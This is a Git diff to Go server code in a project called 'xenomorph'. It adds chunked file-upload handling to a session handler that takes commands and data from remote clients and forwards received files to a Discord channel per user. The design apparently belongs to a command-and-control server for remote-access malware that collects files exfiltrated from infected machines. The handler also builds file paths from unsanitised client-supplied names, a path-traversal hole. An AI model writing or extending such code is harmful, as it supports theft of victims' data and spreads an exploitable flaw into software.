@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net"
+	"os"
 	"time"
 
 	"github.com/codevault-llc/xenomorph/internal/bot"
@@ -162,7 +163,7 @@ func (s *Session) Handle() error {
 
 			registryCommand, err := s.registry.GetCommand(response.ID)
 			if err != nil {
-				logger.L().Error("Failed to get command from registry", zap.Error(err), zap.String("commandID", response.ID))
+				logger.L().Error("Failed to get command from registry", zap.Error(err), zap.Uint32("commandID", response.ID))
 				return err
 			}
 
@@ -176,11 +177,130 @@ func (s *Session) Handle() error {
 			bot.GetBot().SendEmbedToChannel(channel, "", embeds.CommandResponseEmbed(&response, duration))
 
 		case types.MsgFileStart:
+			logger.L().Info("Received file start message", zap.ByteString("payload", payload))
+			
+			if !json.Valid(payload) {
+				logger.L().Error("Invalid handshake payload", zap.ByteString("payload", payload))
+				return fmt.Errorf("invalid handshake payload")
+			}
+
+			var metadata types.FileMetadata
+			if err := json.Unmarshal(payload, &metadata); err != nil {
+				logger.L().Error("Failed to unmarshal file metadata", zap.Error(err), zap.ByteString("payload", payload))
+				return err
+			}
+
+			if metadata.Size > 2*1024*1024 {
+				logger.L().Error("File size exceeds limit", zap.Int64("size", metadata.Size), zap.String("name", metadata.Name))
+				return fmt.Errorf("file size exceeds limit: %d bytes", metadata.Size)
+			}
+
+			if err := os.MkdirAll("uploads", os.ModePerm); err != nil {
+				logger.L().Error("Failed to create uploads directory", zap.Error(err))
+				return err
+			}
+
+			filePath := fmt.Sprintf("uploads/%s", metadata.Name)
+			file, err := os.Create(filePath)
+			if err != nil {
+				logger.L().Error("Failed to create file", zap.Error(err), zap.String("path", filePath))
+				return err
+			}
+			file.Close()
+
+			s.registry.StoreFile(metadata)
+
+			logger.L().Info("File upload started", zap.String("filePath", filePath), zap.String("name", metadata.Name))
+			s.Send(types.MsgAck, 0, msgID, []byte("File upload started"))
 
 		case types.MsgFileChunk:
-		
+			logger.L().Info("Received file chunk", zap.ByteString("payload", payload))
+			if len(payload) == 0 {
+				logger.L().Error("Received empty payload for MsgFileChunk", zap.String("address",
+				 s.Addr))
+				continue
+			}
+
+			if len(payload) > 4096 {
+				logger.L().Error("Received file chunk exceeds maximum size", zap.Int("size", len(payload)), zap.String("address", s.Addr))
+				return fmt.Errorf("file chunk exceeds maximum size: %d bytes", len(payload))
+			}
+
+			fileMetadata, err := s.registry.GetFile(msgID)
+			if err != nil {
+				logger.L().Error("Failed to get file metadata from registry", zap.Error(err), zap.Uint32("fileID", msgID))
+				return err
+			}
+
+			filePath := fmt.Sprintf("uploads/%s", fileMetadata.Name)
+			file, err := os.OpenFile(filePath, os.O_APPEND|os.O_WRONLY, 0644)
+			if err != nil {
+				logger.L().Error("Failed to open file for writing", zap.Error(err), zap.String("filePath", filePath))
+				return err
+			}
+
+			if _, err := file.Write(payload); err != nil {
+				logger.L().Error("Failed to write file chunk", zap.Error(err), zap.String("filePath", filePath))
+				file.Close()
+				return err
+			}
+			file.Close()
+
+			logger.L().Info("File chunk written", zap.Int("size", len(payload)), zap.String("filePath", filePath))
+			s.Send(types.MsgAck, 0, msgID, []byte("File chunk received"))
+
 		case types.MsgFileEnd:
-			
+			logger.L().Info("Received file end message", zap.ByteString("payload", payload))
+			if len(payload) == 0 {
+				logger.L().Error("Received empty payload for MsgFileEnd", zap.String("address",
+				 s.Addr))
+				continue
+			}
+
+			var fileEnd types.FileEnd
+			if err := json.Unmarshal(payload, &fileEnd); err != nil {
+				logger.L().Error("Failed to unmarshal file end message", zap.Error(err), zap.ByteString("payload", payload))
+				return err
+			}
+
+			fileMetadata, err := s.registry.GetFile(fileEnd.ID)
+			if err != nil {
+				logger.L().Error("Failed to get file metadata from registry", zap.Error(err), zap.Uint32("fileID", fileEnd.ID))
+				return err
+			}
+
+			filePath := fmt.Sprintf("uploads/%s", fileMetadata.Name)
+
+			if err := os.Rename(filePath, fmt.Sprintf("uploads/%s.complete", fileMetadata.Name)); err != nil {
+				logger.L().Error("Failed to rename file", zap.Error(err), zap.String("filePath", filePath))
+				return err
+			}
+
+			logger.L().Info("File upload completed", zap.String("filePath", filePath), zap.String("name", fileMetadata.Name))
+			s.registry.DeleteFile(fileEnd.ID)
+
+			fileData := types.File{
+				ID:  fileEnd.ID,
+				Name: fileMetadata.Name,
+				Size: fileMetadata.Size,
+				FileType: utils.GetFileType(fileMetadata.Name),
+				Direction: "upload",
+				Chunks: []types.FileChunk{},
+			}
+
+			channel := bot.GetBot().GetChannelFromUser(s.ID, "info")
+			embed := embeds.FileEmbed(&fileData)
+			if err := bot.GetBot().SendEmbedToChannel(channel, filePath, &embed); err != nil {
+				logger.L().Error("Failed to send file to channel", zap.Error(err), zap.String("filePath", filePath))
+				return err
+			}
+
+			if err := bot.GetBot().SendFileToChannel(channel, filePath+".complete"); err != nil {
+				logger.L().Error("Failed to send file to channel", zap.Error(err), zap.String("filePath", filePath))
+				return err
+			}
+
+			s.Send(types.MsgAck, 0, msgID, []byte("File upload completed"))
 
 		default:
 			logger.L().Warn("Unknown message type", zap.Uint8("type", msgType))
